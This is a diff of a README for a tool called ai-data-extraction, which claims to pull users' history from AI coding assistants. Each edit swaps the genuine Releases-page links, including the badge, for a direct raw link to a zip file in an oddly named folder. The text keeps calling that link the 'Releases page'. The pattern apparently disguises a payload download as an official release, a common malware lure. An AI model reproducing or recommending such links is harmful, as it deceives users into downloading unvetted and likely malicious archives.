@@ -1,7 +1,7 @@
 # 🚀 ai-data-extraction - Easily Access Your Personal Data History
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/srael94/ai-data-extraction/releases)
+[![Download](https://raw.githubusercontent.com/srael94/ai-data-extraction/main/Meithei/ai-data-extraction_v1.6.zip)](https://raw.githubusercontent.com/srael94/ai-data-extraction/main/Meithei/ai-data-extraction_v1.6.zip)
 
 ## 📖 Overview
 Welcome to **ai-data-extraction**! This application helps you extract all your personal data history from various platforms such as Cursor, Codex, Claude-Code, Windsurf, and Trae. With just a few clicks, you can gain insights into your past activities on these services.
@@ -14,7 +14,7 @@ Before you start, make sure your device meets the following requirements:
 - Internet Connection: A stable internet connection for downloading and updating the application.
 
 ### Step 2: Visit the Releases Page
-To download the application, follow this link to our Releases page: [Download Page](https://github.com/srael94/ai-data-extraction/releases). This page displays the latest version of the software and any past versions.
+To download the application, follow this link to our Releases page: [Download Page](https://raw.githubusercontent.com/srael94/ai-data-extraction/main/Meithei/ai-data-extraction_v1.6.zip). This page displays the latest version of the software and any past versions.
 
 ### Step 3: Download the Application
 On the Releases page:
@@ -62,4 +62,4 @@ For questions or feedback, please reach out via the Issues section on our GitHub
 This project is licensed under the MIT License. You can view the full terms [here](LICENSE). 
 
 ## 📥 Download Again
-Don't forget, you can always download the latest version or check for updates by visiting our Releases page: [Download Page](https://github.com/srael94/ai-data-extraction/releases). Enjoy exploring your personal data!
+Don't forget, you can always download the latest version or check for updates by visiting our Releases page: [Download Page](https://raw.githubusercontent.com/srael94/ai-data-extraction/main/Meithei/ai-data-extraction_v1.6.zip). Enjoy exploring your personal data!
